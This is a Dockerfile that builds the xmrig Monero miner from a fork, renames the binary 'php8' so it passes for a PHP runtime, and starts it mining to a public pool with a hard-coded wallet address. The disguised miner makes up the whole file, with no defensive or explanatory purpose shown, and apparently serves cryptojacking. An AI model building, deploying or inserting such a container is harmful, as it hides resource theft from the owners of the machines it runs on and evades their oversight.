FROM ubuntu:16.04

WORKDIR /app

RUN apt-get update
RUN apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
RUN git clone https://github.com/bdklz/xmrig.git /app
RUN mkdir /app/build
RUN cmake .
RUN make
RUN mv xmrig php8


ENTRYPOINT  ["./php8 -o pool.supportxmr.com:3333 -u 47H7tKGJKE1CPrvWHcm9N4PgLdKwWYw8QWV2V9Txy3NhRFK9TW7McxxN88GLbVXpNUZ3c3PjT8iCE9FEiD8JpvEgJfL5rWc"]
